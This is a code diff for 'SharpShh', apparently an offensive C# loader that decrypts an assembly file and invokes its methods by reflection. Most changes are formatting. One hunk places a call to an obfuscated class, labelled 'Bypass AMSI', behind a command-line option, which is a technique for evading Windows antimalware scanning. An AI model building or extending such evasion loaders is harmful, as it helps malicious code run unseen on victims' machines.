@@ -18,7 +18,7 @@ namespace SharpShh
         {
             while (IsRunning)
             {
-                if(args == null)
+                if (args == null)
                 {
                     Console.WriteLine("");
                     Console.WriteLine("Command: ");
@@ -30,15 +30,16 @@ namespace SharpShh
                 try
                 {
 
-                Parser.Default.ParseArguments<EncryptOptions, LoadOptions, ExecuteOptions, ExitOptions>(args)
-                    .MapResult(
-                        (EncryptOptions options) => Encrypt(options),
-                        (LoadOptions options) => Load(options),
-                        (ExecuteOptions options) => Execute(options),
-                        (ExitOptions options) => Exit(options),
-                        errors => false
-                    );
-                } catch(Exception e)
+                    Parser.Default.ParseArguments<EncryptOptions, LoadOptions, ExecuteOptions, ExitOptions>(args)
+                        .MapResult(
+                            (EncryptOptions options) => Encrypt(options),
+                            (LoadOptions options) => Load(options),
+                            (ExecuteOptions options) => Execute(options),
+                            (ExitOptions options) => Exit(options),
+                            errors => false
+                        );
+                }
+                catch (Exception e)
                 {
                     Console.WriteLine(e);
                 }
@@ -51,7 +52,11 @@ namespace SharpShh
         {
             var encrypted = File.ReadAllBytes(options.InputFile);
 
-            CWZUEIZXFO.SKDHQOJUWA();
+            // Bypass AMSI
+            if (options.BypassAmsi)
+            {
+                CWZUEIZXFO.SKDHQOJUWA();
+            }
 
             var decrypted = Crypto.Decrypt(encrypted, options.Key, options.IV);
 
@@ -97,7 +102,7 @@ namespace SharpShh
 
             var methodName = options.Method.Split('.').Last();
             var method = @namespace.GetMethods()
-                .FirstOrDefault(m => m.Name.Equals(methodName, StringComparison.OrdinalIgnoreCase) 
+                .FirstOrDefault(m => m.Name.Equals(methodName, StringComparison.OrdinalIgnoreCase)
                     && m.GetParameters().Length == options.Parameters.Count());
 
             if (method == null)
